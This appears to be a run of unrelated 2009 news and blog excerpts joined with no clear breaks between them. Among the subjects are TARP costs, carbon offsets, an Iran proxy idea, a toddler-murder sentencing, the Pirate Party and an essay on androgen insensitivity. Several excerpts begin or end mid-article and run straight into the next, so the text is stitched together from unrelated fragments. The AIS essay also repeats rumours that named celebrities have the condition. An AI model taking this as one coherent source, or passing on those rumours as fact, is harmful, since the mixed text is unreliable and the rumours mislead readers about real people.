Costs include $ 2.3 trillion in programs offered by the Federal Deposit Insurance Corp. , $ 7.4 trillion in TARP and other aid from the Treasury and $ 7.2 trillion in federal money for Fannie Mae , Freddie Mac , credit unions , Veterans Affairs and other federal programs , he said .
Barofsky offered criticism in a separate quarterly report of Treasury ’s implementation of TARP , saying the department has “ repeatedly failed to adopt recommendations ” needed to provide transparency and fulfill the administration ’s goal to implement TARP “ with the highest degree of accountability . ”
As a result , taxpayers do n’t know how TARP recipients are using the money or the value of the investments , he said in the report .
Banks Fail to Make Adequate Loan-Loss Provisions
Banks have failed to make adequate provision for the losses on loans and securities they face before the end of next year , Moody ’s Investors Service said .
U.S. banks may incur about $ 470 billion of losses and writedowns by the end of 2010 , which may cause the banks to be unprofitable in the period , the ratings company said in a report published today .
“ Large loan losses have yet to be recognized in the banking system , ” Moody ’s said .
“ We expect to see rising provisioning needs well into 2010 . ”
Banks and financial firms worldwide have reported losses and writedowns of $ 1.5 trillion since the credit crisis began in 2007 , according to data compiled by Bloomberg .
New York - based Citigroup Inc. has reported $ 112 billion of writedowns , more than any other firm , the data show .
“ The fundamentals of financial institutions are still traveling on a downward slope , ” Moody ’s said .
“ No - one should consider recent improvements as assurance that the current rebound can be sustained . ”
Fed 's Game is Delay and Pretend
Danny O'Brien 's got a doozy of a lazyweb idea : " Here 's a way to mash - up two of the most talked - about Internet issues today .
Opera launched their web - server - in - a - browser , Opera Unite , today .
Iranian protestors are looking for proxies to get around Iran 's blocking .
So why not write a Opera Unite service that acts as a simple , quick - and - dirty proxy for Iranians ?
Danny O'Brien lays down the challenge . "
Instead of a real http proxy ( like Psiphon ) , the best implementation would simply let you append a URL to your Unite URL and get a website back , like " http://foo.bar.operaunite.com/www.cnn.com/ " .
That would get rid of handing over your cookies to an unknown third - party ; it 'd probably also discourage people using the service for private communications ( no https , in Unite — it'd be great if Opera fixed that ! ) .
Maybe I 'd also stick in a geoip check to make sure the incoming requests are coming from a known Iranian IP block , just so users could feel worthy that they 're just catering to Iranians ( you could pull them out of this free geolocation database ) .
That way we would n't be creating a permanent global clunky , insecure proxy network — or at least not until Iran recovers and starts its own phishing services .
I know I 'm not a good enough JS programmer to pull this off , but the Unite JavaScript API certainly appears to permit cross - domain XMLHttp calls , and you can catch generic HTTP requests using opera.io.webserver.addEventListener('_request ', somehandler , false ) ; , so it is theoretically possible ( and here I hand wave to the implementation Gods ) .
wanted : spartacus , an opera unite web proxy for iran
( Thanks , Danny ! )
A convenient way of cutting industrial gases that warm the planet was supposed to be the United Nation ’s clean development mechanism ( CDM ) .
As a provision of the Kyoto Protocol , the CDM enables industrial nations to reduce their greenhouse gas emissions in part by purchasing “ carbon offsets ” from poorer countries , where green projects are more affordable .
The scheme , which issued its first credits in 2005 , has already transferred the right to emit an extra 250 million tons of carbon dioxide ( CO 2 ) , and that could swell to 2.9 billion tons by 2012 .
Offsets will “ play a more significant role ” as emissions targets become tighter , asserts Yvo de Boer of the U.N. Framework Convention on Climate Change .
But criticism of the CDM has been mounting .
Despite strenuous efforts by regulators , a significant fraction of the offset credits is fictitious “ hot air ” manufactured by accounting tricks , critics say .
As a result , greenhouse gases are being emitted without compensating reductions elsewhere .
The accounting is rooted in a concept known as additionality .
To earn credits , a project should owe its existence to the prospective earnings from carbon credits : the emissions reductions from the project should be additional to what would have happened in the absence of the CDM .
Hence , the developers of a wind farm in India that replaces a coal - fired power plant could sell the difference in carbon emissions between the two projects as offsets — but not if the wind farm would have been built anyway .
Many CDM projects , however , do not appear to be offsetting carbon output at all .
The Berkeley , Calif . –based organization International Rivers discovered that a third of the CDM ’s hydropower projects had been completed before they were accredited .
Lambert Schneider of Germany ’s Institute for Applied Ecology judged two fifths of the world ’s CDM portfolio to be of similarly questionable additionality .
Climatologist Michael Wara of Stanford University guesses the figure could be much higher , but , he says , “ we have no way of knowing . ”
Determining which projects are “ additional ” can be tricky , explains researcher Larry Lohmann of the Corner House , an environmental think tank based in Dorset , England .
“ There ’s no such thing as a single world line , a single narrative of what would have happened without the project , ” he points out .
“ It ’s not a solvable problem . ”
A related worry is that of perverse incentives .
Consultants assessing a carbon - offset project often compare it with the accepted practice in the developing country where it will be located .
Such an approach gives that country an incentive to take the most polluting line to maximize the credits they earn for a CDM project .
Selling this artificially inflated credit could thus ultimately enable more carbon to be emitted than if the offset had not been created at all .
Take the controversy over gas flaring in Nigeria , where oil firms burn off 40 percent of the natural gas found with oil .
The state - owned Nigeria Agip Oil Company plans instead to generate electricity from the waste gas of its Kwale plant , displacing fossil fuels that might otherwise have been consumed .
That strategy would create credits of 1.5 million tons of carbon dioxide a year for sale .
( A credit for a ton of CO 2 , called a certified emissions reduction , has been selling for about $ 15 in Europe . )
The project is deemed additional because the prospect of selling offsets motivated the developers .
But activist Michael Karikpo of Oilwatch finds that classification to be “ out­rag­eous ” — because routine flaring , which spews carcinogens such as benzene and triggers acid rain , is illegal in Nigeria .
No company should profit from flouting the law , he adds : “ It ’s like a criminal demanding money to stop committing crimes . ”
Nevertheless , the incentive to declare a project as additional is powerful .
Pan Ocean Oil Corporation , based in Nigeria , has applied for CDM approval for an effort to process and market waste gas from its Ovade - Ogharefe oil field .
Should the government begin enforcing the law against flaring , it would render the project nonadditional and sacrifice considerable benefits .
The CDM ’s executive board has strengthened its review process to improve the tests for additionality and to reduce perverse incentives .
For instance , the board no longer accepts new projects for burning off HFC - 23 , a greenhouse gas produced during the manufacture of refrigerant , because the windfall credits it generated had created an incentive to set up chemical factories for the sole purpose of burning HFC - 23 .
( Because of HFC - 23 ’s heat - trapping potency , one ton of it fetches 12,000 CO 2 credits . )
Some observers think the CDM is too far gone to salvage .
No amount of tinkering will repair such a “ fundamental design flaw ” as additionality , Wara contends .
Last November the U.S. Government Accountability Office warned that carbon offsets “ may not be a reliable long - term approach to climate change mitigation . ”
In January the European Commission determined that the CDM should be phased out for at least the more advanced developing countries , which would instead be pressured to accept binding commitments to limit emissions .
Another proposal would replace the CDM with a fund for developing countries to build green projects without generating credits — thereby eliminating the entire concept of additionality .
Doing away with the CDM and other offsets could be hard , though , because they are the easiest way for industrial nations to meet their emissions targets .
The U.S. is considering a bill to reduce emissions by an ambitious 20 percent by 2020 , but its provisions are so generous that apparently the country could meet its goal just by buying offsets .
The fate of the CDM will be decided in climate talks to be held in December in Copenhagen .
Paying the Polluters
The World Bank is supposed to encourage sustainability , but much of its financing for carbon offsets ironically goes to polluters .
For instance , the bank ’s private - sector lending arm is financing a coal - fired power plant in Gujarat , India , that will generate 25.7 million tons of carbon dioxide a year .
The bank also hopes to garner brokerage fees from the sale of offsets worth three million tons of carbon a year , earned by energy - efficient processes at the same plant .
Janet Redman of the Institute for Policy Studies in Washington , D.C. , charges that four fifths of the bank ’s carbon finance portfolio is invested in offsets from polluting industries such as coal , chemicals , iron and steel .

ONE OF THESE THINGS IS NOT LIKE THE OTHER ….
A new Research 2000 poll conducted for Daily Kos asked respondents a rather straightforward question : “ Do you believe that Barack Obama was born in the United States of America or not ? ”
Since the president was born in the U.S. , ideally , the results would be around 100 % .
They were n’t .
There was , not surprisingly , a significant partisan gap .
Only 4 % of Democrats are confused about the president ’s place of birth .
The number is slightly higher among independents , 8 % of whom got it wrong .
Among Republicans , though , 28 % — more than one in four — believe President Obama was not born in the United States .
For a crazy , demonstrably false , racist idea , these are discouraging numbers .
But I was especially surprised by the regional breakdowns .
In the Northeast , West , and Midwest , the overwhelming majorities realize the president is a native - born American .
But notice the South — only 47 % got it right and 30 % are unsure .
Outside the South , this madness is gaining very little traction , and remains a fringe conspiracy theory .
Within the South , it ’s practically mainstream .

Legend
Sugar Labs , a nonprofit organization that builds open source educational software , has announced the official release of Sugar on a Stick , a Linux - based platform that includes a suite of child - friendly learning tools .
The software is available for download and is designed to be run entirely from a USB memory stick or similar removable media .
Sugar Labs was founded last year by Walter Bender , the former software president of the One Laptop Per Child ( OLPC ) project .
Bender split from OLPC along with several other key figures following organizational changes that raised serious questions about OLPC 's long - term viability and commitment to the open source philosophy .
Sugar Labs has taken on the role of maintaining OLPC's Sugar learning environment and seeks to make it accessible to a significantly broader audience .
The official release of Sugar on a Stick ( SoaS ) is a significant milestone for the Sugar project .
In this release , the platform exhibits a much higher level of refinement and maturity than the previous versions , which were shipped on OLPC 's XO laptops .
The user interface is smoother , the individual components seem better integrated , and many impressive new programs that have been added .
SoaS is built on top of Fedora 11 , which was released earlier this month .
It is distributed as a 380MB ISO file which includes the operating system and all of the software applications .
The image is intended to be written to a CD or USB memory stick so that the entire platform can be booted from removable media and used on regular desktop computers without requiring installation , partitioning , or any other changes to the computer itself .
When Sugar runs from a memory stick , the user 's files can be stored directly on the device .
This completely portable and self - contained approach makes it possible for students to use at school and at home .
It also makes it easy for schools to repurpose existing computers and get them up and running with the Sugar learning environment with minimal difficulty and investment .
" One year after its founding , Sugar Labs is delivering on its education promise for its second million learners , " Bender said in a statement .
" Sugar is preferred because it is a superior learning experience for young children : engaging while being affordable .
Sugar on a Stick is a great way to try Sugar without touching your computer 's hard disk .
It is also well suited to slower , older PCs and low - powered netbooks . "
Sugar Labs has received a grant to deploy the software at an elementary school in Boston .
It will be shipped with a new generation of OLPC laptops that is coming later this year and will also be made available as a software update to owners of previous OLPC laptop models .
We got our first taste of Sugar on a Stick earlier this year when the first beta version was made available for testing .
The 1.0 release is a lot like the beta but with additional refinement and some new software .
One of the additions is a mindmapping tool called labyrinth .
The Sugar learning environment has come a long way over the past year and it appears to have considerable potential .
It offers a nice mix of tools for collaboration and education that could make it a success in classrooms .

Karl McCluney denied murder but was convicted last month A 16 - year - old boy who beat a toddler to death while babysitting her has been ordered to be detained for 15 years .
Karl McCluney punched Demi Leigh Mahon in the face , bit her and left her with at least 68 injuries in the sustained attack in Salford in July 2008 .
The two - year - old suffered brain damage and died two days later .
McCluney , who was left in charge of Demi Leigh for about an hour and a half , admitted manslaughter but was convicted of murder by a jury .
He attacked Demi Leigh on his 15th birthday .
' Stood no chance '
The teenager sat slouched in a chair as the sentence was handed to him by Mr Justice Sweeney , who described the murder as " savage " .
He said McCluney was " fed up " because no - one had planned anything for his birthday and became angry when Demi Leigh began crying .
" You got angrier and angrier until you lost your temper altogether , " the judge said .
Demi Leigh Mahon was left brain - damaged in the attack " You then , over a period according to you of about 10 minutes , hit her many times .
" You were large and powerful , she was only a small child and stood no chance against your onslaught .
" It is clear that your severe conduct disorder means that you are a dangerous young man who presents a significant risk to public safety .
" You will not be released until such time as it is decided you no longer pose a danger .
When that might be is , at present , impossible to tell , " the judge added .
Demi Leigh was left with McCluney by her mother , Ann Marie McDonald , on 15 July 2008 while she went to cash her child benefit .
He deserved what he got - but it is a shame hanging was not an option
Gary Mahon , father
The teenager took Demi Leigh to the park before carrying out the attack at his home in Liverpool Road , Eccles .
McCluney had admitted manslaughter on the grounds of diminished responsibility but the jury at Liverpool Crown Court rejected this claim and convicted him of her murder on 26 June .
The court heard that he was diagnosed as suffering an unsocialised conduct disorder and had a " below normal " IQ .
McCluney has never fully explained his attack on Demi Leigh but had alluded to the fact he was angry with her behaviour .
Social work failings Det Supt Geoff Wessell , who led the investigation , said : " Despite his young age McCluney is an extremely dangerous young man .
" While I am pleased he will be off the streets for a very long time , there is no sentence that can bring Demi back to her family . "
Salford Children 's Services admitted failings in the protection of Demi Leigh after a review found telephone calls from relatives concerned about her welfare were not followed up properly .
Concerns about Ms McDonald 's drug problems were not dealt with adequately and there were a number of " missed opportunities " for intervention , the review found .
Speaking after the sentencing , Demi Leigh 's father Gary , 41 , said he was happy with the sentence .
" He deserved what he got - but it is a shame hanging was not an option .
" We had justice for Demi Leigh today and now she can rest in peace . "

The same year , when the Serbs were imposing “ ethnic cleansing ” on the Muslims in Bosnia and the world was wringing its hands , op - ed columnists urged the supply of arms and NATO air support to the besieged Bosnians in their homeland .
Gen. Colin Powell told The New Yorker : “ William Safire and Tony Lewis say this will only take a little bit of bombing and it will work . . . and Safire . . . just says , ‘ Air power can do it . ’
Forget it . ”
Rather than whine about his misrepresentation of my position , I counterattacked : “ That ’s the straw - man trick :
Take your opponent ’s argument to a ridiculous extreme and then attack the extreme . ”
( U.S. air power helped force the Serbs out and also led to today ’s independent Kosovo . )
Now for my own perp walk :
Such mid-1990s straw - manese reminded me of a speech I drafted for President Nixon to give at the Air Force Academy in 1969 .
Handing over my draft , I carefully advised the president in these words : “ Take the easy way . ”
He looked surprised but understood when he read the line “ It would be easy for a president of the United States to buy some popularity by going along with the new isolationists . ”
For years afterward , Nixon could then truthfully use the “ some say ” straw man : “ Some of my advisers say I should ‘ take the easy way ’ — but I have rejected that course .
. . . ”
THE REAL STRAW MAN
We know the technique ; but what ’s the source of straw man ?
A poet in the 18th century responded to critical judgment with “ Critics , who like the scarecrows stand / upon the poet ’s common land . ”
The best guess about the trope ’s origin is the farmer ’s scarecrow — an old coat and hat set up on a pole and stuffed with straw to resemble a human sentry and frighten hungry blackbirds away from vegetable seedlings .
Though it appeared in a somewhat sexist 17th - century English saying — “ A man of straw is worth a woman of gold ” — in U.S. politics it was made famous in 1912 by President William Howard Taft , who had been set in place by the retiring Theodore Roosevelt four years earlier but who was being savaged by Teddy ’s campaign to get his old job back : “ I was a man of straw ; but I have been a man of straw long enough .
Every man who has blood in his body , and who has been misrepresented as I have . . . is forced to fight . ”
Taft won renomination , but Roosevelt ran as a “ Bull Moose ” independent , splitting Republicans and helping elect Woodrow Wilson , the Democrat .
Early in the 2008 primary season , The New York Post — not inclined to support most Democrats — surprised readers with the front - page headline “ Post Endorses Obama . ”
David Carr , media reporter for The Times , asked rhetorically , “ Why did The Post kick Senator Clinton to the curb ? ”
While noting that the relationship between Rupert Murdoch of The Post and the Clintons was complicated , he wrote that the endorsement “ invited suggestions that Mr. Murdoch was using The New York Post to set up a straw man for the Republicans to mow down in the fall . ”
LOS ANGELES -- LeBron James knows he was wrong to snub the Magic and the media , and David Stern decided the NBA was wrong when it did n't punish the MVP for it .
So the commissioner changed his mind and fined James $ 25,000 for skipping the postgame news conference after Cleveland lost to Orlando in the Eastern Conference finals .
Stern said Thursday night that he spoke with the Cavaliers star on Wednesday , a day after James had surgery to remove a benign growth near his jaw , and that James admitted he was wrong to not congratulate Orlando 's players and coaches after the loss .
" He asked that I express to the media , the Magic and the fans his apology , and particularly the young fans , because he knows he has a responsibility to all of our fans , and that sportsmanship is appropriate whether you win or whether you lose , " Stern said near the start of his annual NBA finals press conference .
" He understands why it was necessary for me to fine him $ 25,000 for missing the media availability . "
The league first said James would n't be penalized , citing his usual cooperation with the press .
Stern said he reconsidered after thinking about it more .

KEY FEATURES
Search is the beginning and the end of the internet .
Before search , there was the idea of an organised , hierarchical internet , set up along the lines of the Dewey Decimal system .
Again and again , net pioneers tried to build such systems , but they were always outcompeted by the messy hairball of the real world .
As Wikipedia shows , building consensus about what goes where in a big org chart is hard , and the broader the subject area , the harder it gets .
Melvin Dewey did n't predict computers ; he also mixed Islam in with Sufism , and gave table - knocking psychics their own category .
A full - contact sport like the internet just does n't lend itself to a priori categorisation .
Enter search .
Who needs categories , if you can just pile up all the world 's knowledge every which way and use software to find the right document at just the right time ?
But this is not without risk : search engines accumulate near - complete indexes of our interests , our loves , our hopes and aspirations .
Our relationship with them is as intimate as our relationships with our lovers , our confessors , our therapists .
What 's more , the way that search engines determine the ranking and relevance of any given website has become more critical than the editorial berth at the New York Times combined with the chief spots at the major TV networks .
Good search engine placement is make - or - break advertising .
It 's ideological mindshare .
It 's relevance .
Contrariwise : being poorly ranked by a search engine makes you irrelevant , broke and invisible .
What 's more , search engines routinely disappear websites for violating unpublished , invisible rules .
Many of these sites are spammers , link - farmers , malware sneezers and other gamers of the system .
That 's not surprising : every complex ecosystem has its parasites , and the Internet is as complex as they come .
The stakes for search - engine placement are so high that it 's inevitable that some people will try anything to get the right placement for their products , services , ideas and agendas .
Hence the search engine 's prerogative of enforcing the death penalty on sites that undermine the quality of search .
It 's a terrible idea to vest this much power with one company , even one as fun , user - centered and technologically excellent as Google .
It 's too much power for a handful of companies to wield .
The question of what we can and can't see when we go hunting for answers demands a transparent , participatory solution .
There 's no dictator benevolent enough to entrust with the power to determine our political , commercial , social and ideological agenda .
This is one for The People .
Put that way , it 's obvious : if search engines set the public agenda , they should be public .
What 's not obvious is how to make such a thing .
We can imagine a public , open process to write search engine ranking systems , crawlers and the other minutiae .
But can an ad - hoc group of net - heads marshall the server resources to store copies of the entire Internet ?
Could we build such a thing ?
It 'd be as unlikely as a noncommercial , volunteer - written encyclopedia .
It would require vast resources .
But it would have one gigantic advantage over the proprietary search engines : rather than relying on weak " security through obscurity " to fight spammers , creeps and parasites , such a system could exploit the powerful principles of peer review that are the gold standard in all other areas of information security .
Google itself was pretty damned unlikely – two grad students in a garage going up against vast , well - capitalised mature search companies like AltaVista ( remember them ? ) .
Search is volatile and we'd be nuts to think that Google owned the last word in organising all human knowledge .

Things could be about to get very interesting at the European Parliament .
The Swedish news site The Local is reporting that the country ’s Pirate Party is on course to win two seats in the European Parliament when results from this week ’s elections start to come through this evening .
The party , that has copyright law reform at the top of its agenda , has seen a huge increase in support since The Pirate Bay ’s guilty verdict in April .
While success for the party would n’t mean file sharing would be suddenly legalised , it would mean that pirates would have a legitimate political voice in the European Parliament for the first time .
The Party ’s growth shows just how unhappy many people are with the bullying practices of the entertainment industry .
Whether or not you agree with increased rights for pirates , the Pirate Party has done something that most politicians fail to do ; make young people take notice of politics by dealing with issues they ’re interested in .
Meanwhile in the UK , a just as unusual party is eyeing success in tonight ’s poll results .
Jury Team is a party with no policies of its own .
It ’s made up of independent candidates who were selected via an online poll .
Candidates are encouraged to campaign via Facebook , MySpace , Twitter and a personal blog .
How successful can a bunch of pirates and party with no policies be ?
We ’ll find out tonight .
UPDATE : As it turned out , The Pirate Party won just one seat .
Still , who would have thought that would happen when they formed three years ago ?
Read next : Google vs. Yahoo vs. Bing .
Proof that results are almost identical .
Does it matter ?
BoldProgressives.org has sent out the following letter to their membership :
People are outraged that Senate Democrats are lining up against a public health insurance option supported by 76 % of Americans -- all while taking $ 80 million of health and insurance industry money .
So we decided to do something about it .
We made a TV ad calling them out .
And now we 're inviting you ( and your friends ) to put your name in the ad before we air it in Washington DC !
This ad will air on CNN , MSNBC , The Daily Show , and other places that these senators and their staffers will be sure to notice .
We 'll continually rotate new names in .
Please help this idea grow by passing this email on to anyone you think would like to add their name .
Together , we 'll make the Senate listen to the vast majority of Americans who say : " We want the public option ! "
Thanks for being a bold progressive .
If you 're interested in putting your name -- literally - - on this ad , please go to WeWantThePublicOption.com and add your name to the list .
The people need all the voices we can get on the public option and I applaud BoldProgressives for making this great ad and allowing citizens to get involved .
To me it is unconscionable that we have to push Democrats to vote for an issue that SHOULD be a staple of their party .
If they let us down , we 'll have to fight them at the ballot box and replace them with people who will do the right thing for their constituents .

نامه رابرت ردفورد در حمایت از اعتصاب غذای نیویور ک
خبرنامه گویا - رابرت ردفورد بازیگر و کارگردان نامدار آمریکا، طی نامه ای از اعتصاب غذای سه روزه ی روشنفکران و هنرمندان ایرانی در برابر سازمان ملل متحد در نیویورک حمایت به عمل آورد .
او نوشته است :
" حواد ث یک ماه گذشته ایران تکان دهنده بود .
بسیار ی از مردم در این رویداد کشته، و صدها انسان بی گناه زندانی شدند .
من قویاً از حقوق بشر مردم ایران دفاع می کنم .
اعتصاب غذا در برابر سازمان ملل یک شیوه ی جلب توجه جهان نسبت به وضعیت اسفبار زندانیان سیاسی درایران است .
من از این تلاش حمایت می کنم، و دخترم، ایمی ردفورد، به نشان بیان همبستگ ی ام با ملت ایران، و به امید دست یافتن به هدف انسانی آ زادی زندانیان سیاسی در ایران در آنجا حضور خواهد یافت " .
رابرت ردفورد
" Political events in Iran over the past month have been dramatic .
Many
have been killed and hundreds of innocent people have been imprisoned .
I strongly defend the human rights of the people of Iran .
A hunger
strike in front of the United Nations is one way of drawing world
attention to the plight of political prisoners in Iran .
I support this
effort and my daughter , Amy Redford , will be there as an expression of
solidarity with the Iranian people , and in the hope of achieving the
humanitarian goal of freeing political prisoners in Iran . ”
Robert Redford
A great deal of flak has been flying back and forth across the blogosphere in recent weeks on , once again , the issue of compatibility between science , atheism and religion .
The latest round was sparked by a Pew study on how the public views conflicts between science and faith , with Jerry Coyne arguing for incompatibility , Chris Mooney taking the opposite position .
I have a few thoughts of my own .
First , the survey .
There are a few choice pieces of data , such as this one which finds that creationist attempts to portray evolution as a “ controversy ” have not succeeded :
Interestingly , many of those who reject natural selection recognize that scientists themselves fully accept Darwin ’s theory .
In the same 2006 Pew poll , nearly two - thirds of adults ( 62 % ) say that they believe that scientists agree on the validity of evolution .
But more important is this :
When asked what they would do if scientists were to disprove a particular religious belief , nearly two - thirds ( 64 % ) of people say they would continue to hold to what their religion teaches rather than accept the contrary scientific finding , according to the results of an October 2006
Time magazine poll .
Indeed , in a May 2007 Gallup poll , only 14 % of those who say they do not believe in evolution cite lack of evidence as the main reason underpinning their views ; more people cite their belief in Jesus ( 19 % ) , God ( 16 % ) or religion generally ( 16 % ) as their reason for rejecting Darwin ’s theory .
As far as I can tell , the data is undisputed .
The question is how we should react to it .
Mooney believes we should set an accommodationist course :
For it seems to me that if we could only dislodge the idea that evolution is contradictory to people ’s belief … then they would have no problem with evolution .
… I ’m quite convinced that the data are an excellent reason to take Kenneth Miller ’s ( and my ) approach and try to convince people that science need n’t be any threat to their religion – indeed , they show that this is a strategy which ought to work for many Americans .
I have two points to make in response to this .
First of all , what is Mooney ’s strategy for convincing the faithful that evolution and religion are compatible ?
The creationists are devoted to spreading the opposite message , and they have large , well - financed ministries , propaganda mills cranking 24 hours a day , and even their own , multimillion - dollar creationist museum .
They ’ve spent decades and millions of dollars drumming it into their followers ’ heads that six - day creation is a vital and essential keystone of the Christian worldview , and that evolution is not just false , but an evil , dangerous , even Satanic deception that leads directly to genocide , school shootings , abortion and homosexuality .
And for the most part , they view pro-science Christians as just as bad : as weak , rootless believers in a “ sad and sorry god “ .
The accommodationist strategy backed by Mooney and others is the same one that we ’ve been trying for decades .
Clearly , it has n’t worked .
The simple , literal , easy - to - understand theology of the creationists has been demonstrated to have mass popular appeal .
Meanwhile , the theistic evolutionists – whose theology tends to depict God as distant and vague at best – has not had similar success with the public .
So , I ask the accommodationists in all seriousness :
How is your approach different from what ’s already been tried ?
You ’ve already voiced your belief that atheist scientists should stop speaking up .
What , in your view , is the next step ?
How do you plan to overcome the fears and prejudices that creationists have pounded into their followers ’ heads , and what makes you think this will be easier than what the atheists have set out to do ?
Second , I want to point out an implication of this strategy that Mooney does n’t dwell on : it ’s remarkable to what extent this is a strategy of surrender .
It takes for granted that people ’s religious beliefs are fixed and immutable , that if their beliefs conflict with science they ’ll always reject science , and our only hope is to convince them that evolution poses no threat to their faith .
Given this assumption , Mooney believes that he can change people ’s beliefs about whether evolution conflicts with their faith .
But why should this be easier than convincing them of a different proposition – that if science and faith conflict , science should win out ?
As the Pew survey shows , an overwhelming majority ( 87 % ) even of religious people respect science and feel that it makes society better .
Why ca n’t we build on that fact instead ?
The accommodationist strategy implicitly validates the very prejudice it seeks to counter : that faith is superior to science and should win out if the two conflict .
This would be like a person who lived during the suffragist era conceding the anti-feminist argument that women are intellectually inferior to men , but arguing that they should get to vote anyway , because after all , we do n’t make men pass intelligence tests to vote , do we ?
This is fighting on your opponent ’s turf , which is a sure way to lose .
To defeat a prejudice , we should attack it at its source .
Plenty of ideas that were once common and widely believed , such as the idea of female inferiority , turned out not to be invulnerable ; they crumbled under strong , direct criticism .
And there is good reason to believe the same is true in this case : the ever - growing numbers of the godless suggest that attacking religion is not the losing strategy that accommodationists would have us believe .
Years ago , in college , I met the perfect woman .
Or perhaps a man ’s idea of the perfect woman .
She had flawless and dewy skin , angular cheekbones , a cinched waist , milkmaid breasts , long legs , dove - like hands , lush long hair .
Wherever she went , people swiveled their necks and stared .
She was a fantasy , a vision .
A goddess .
And she was miserable .
It emerged that the source of her pain was a secret that she kept until she enrolled in a radical gender studies class .
Inspired , she came to terms with her identity , and in the telling she liberated herself .
Her secret was that she was n’t technically female .
She had a condition known as androgen insensitivity syndrome ( AIS ) .
She was the perfect woman on the outside , and inside she felt perfectly female .
But she was genetically male ( XY ) .
Her story was typical for women with complete AIS .
At birth her doctors did n’t notice any difference in her genitalia .
In high school she went from being a normal girl to an Amazonian queen .
She was not only taller than her peers but curvier , too ( some androgens are converted to estrogen which act on breast tissue ) .
Unlike other girls , she never got acne or grew pubic or armpit hair ( androgens regulate hair growth ) .
She had no body odor .
She got recruited as a runway model , was attracted to men and had many boyfriends ( including a celebrity ) , and had sex , albeit painfully .
But by age sixteen she did n’t get her period , so her mother brought her to the doctor and an astonishing discovery was made .
She had undescended testes .
Inside , she appeared male : no fallopian tubes , no uterus , no ovaries .
This gorgeous college student had complete androgen insensitivity syndrome .
Women with this condition — approximately 1 in 20,000 — tend to be exceptionally tall and striking in appearance .
AIS is caused by a recessive variant of the gene that codes for Androgen Receptor .
Because the body is insensitive to the androgen testosterone , the usual male features — penis , testes , scrotum , etc. — are unable to develop .
The default phenotype is female , so people with AIS have a vagina or “ vaginal pouch ” ( although most AIS women require surgical expansion ) .
If a woman with AIS were to get a blood test , her testosterone levels would be as high as any man ’s , but her body ca n’t process the hormone .
That ’s why women with complete AIS are so feminine — arguably more so than other women .
( Some people with AIS have only partial androgen insensitivity .
Considered intersex , or hermaphrodites , they fall all along the spectrum between typically male and female and have a micropenis .
Naturally , there ’s much controversy about gender assignment at birth and estrogen or testosterone injections at puberty . )
Several women have revealed they have complete or partial AIS , including singer Eden Atwood and tennis player Sarah Gronert .
Although impossible to confirm , several famous celebrities of the past are purported to have had AIS : Wallis Simpson ( Edward may have given up the crown for her , but it is said they could never have sexual relations ) , Queen Elizabeth I , and Joan of Arc. Rumors of AIS abound , perhaps out of jealousy , whenever a celebrity is statuesque , beautiful , and lacking a biological child — Jamie Lee Curtis , Ann Coulter , and even Gisele Bunchen , among many other model types .
In a sense , complete AIS flies in the face of the evolutionary theory I write about in BLONDES .
If straight men are drawn to slim waists , shapely breasts , lush scalp hair , sparse body hair , long legs , and flawless skin because those qualities represent high fertility , then AIS is the ultimate deception .
As gorgeous as an AIS woman is , there ’s no chance of conception .
But this ultimately does n’t matter .
It ’s the 21st century , and an important lesson must be learned : Femininity is about more than reproduction .
In the latest edition of Ask BA , posted yesterday , over on BaseballAmerica.com , Jim Callis responded in depth to a question about Mike Moustakas and Red Sox power - hitting 1B prospect Lars Anderson .
I am glad another well respected expert is on the “ Moose will be just fine ” side of the discussion .
It is important to me that we all keep his performance in perspective so I wanted to share Callis ’ thoughts with everyone here .
Since Hosmer tends to go with Moustakas like peanut butter and chocolate , I thought this would be a good time to give an update on our future 1B as well as updates on David Lough , Jordan Parraz , and Jeff Bianchi .
If you want to read the entire article , and I strongly encourage everyone to do so , click here .
In addition to Moustakas and Anderson it also covers draft pick slots , Tommy Hanson , Mat Latos , and Jared Mitchell .
This is what Callis had to say about Moustakas and Anderson ( I cut out the paragraph that was specific to Lars ) :
I still have a lot of faith in both Moustakas and Anderson .
Neither is savaging pitchers like they did last season — Moustakas is hitting .247/.284/.411 at high Class A Wilmington , and Anderson is batting .259/.349/.390 in Double - A Portland — but both are young for their levels and they ’re still two of the best hitting prospects in the minors .
Moustakas , 20 , has been in a month long slump in July that has killed his numbers , yet ranks fourth in the Carolina League in RBIs ( 61 ) and eighth in homers ( 11 ) .
He has been focusing on working counts and learning which pitches to attack .
At times he has gotten too passive , and at others too aggressive .
He still needs to do a better job of using the whole field and not trying to do too much .
Moustakas also has n’t been helped by playing in one of the most inhospitable home parks in high Class A : his .182/.234/.325 numbers at Wilmington ’s Frawley Stadium are much worse than his .292/.321/.472 numbers on the road .
Moustakas and Anderson are both well ahead of the development curve and have plenty of time to make the necessary adjustments .
My biggest concern about either of them is that I ’m not convinced that Moustakas will have enough range to stay at third base .
But I ’m not at the point where I ’m worrying about their bats .
Callis refers to the “ month long ” slump , but the bulk of the slump occurred after going 2 - 6 on July 13th .
After that game he recorded just one hit in his next 42 at bats and during that stretch , his average plummeted from a very respectable 0.269 to a mark of 0.242 .
His slump got the pessimists and doubters out in force , but make no mistake Moustakas is the real deal and he will be just fine .
In his last 3 games he has turned things back around collecting 5 hits in 13 AB with 2 doubles , 1 HR , and 6 RBI in the process .
Fellow prospect 1B - Eric Hosmer has performed fairly well since his promotion to High - A Wilmington .
In his first 7 games with the Blue Rocks , Hosmer has hit 0.269/.321/.308 in 26 at bats .
Those numbers do n’t jump off the page , but keep in mind that in addition to adjusting to the new level of competition , Hosmer is only 19 and a year younger than Moustakas .
One player who did n’t have trouble hitting in Wilmington was 23 year old OF - David Lough who hit 0.320/.370/.473 in 222 AB as part of the Blue Rocks before being promoted to Double - A NW Arkansas .
Since joining the Naturals , Lough has hit an impressive 0.345/.374/.494 in his first 87 AB .
He has solidified himself as future option for the Royals with his performance this year , but he needs to keep excelling as he moves up .
At 23 he has a much shorter shelf life as a prospect .
Since Lough was drafted out of college instead of HS it should be expected that he perform at a higher level than Moustakas or Hosmer .
After all , he is more significantly more experienced and 3 - 4 years older .
Also in Double - A , OF - Jordan Parraz has gone 6 - 17 with 3 doubles , 1 HR , and 5 RBI in 4 games since returning from injury .
The 24 year old is now hitting 0.358/.451/.553 in 226 AB for the Naturals and has walked more times ( 29 ) than he has struck out ( 25 ) .
If he can stay healthy , a late season call up to the Royals should be in his near future .
Parraz and Lough have been great for the Naturals , but they rank 2nd and 3rd on the team in BA this season ( not counting Gordon ’s rehab ABs ) .
The team leader is 22 year old SS - Jeff Bianchi who is now hitting 0.369/.417/.508 in 130 AB on the season .
After his promotion to Double - A he hit 0.500 in 10 games in June , but he started to slow down in July .
My assumption was that the the new league and advanced competition was catching up to him .
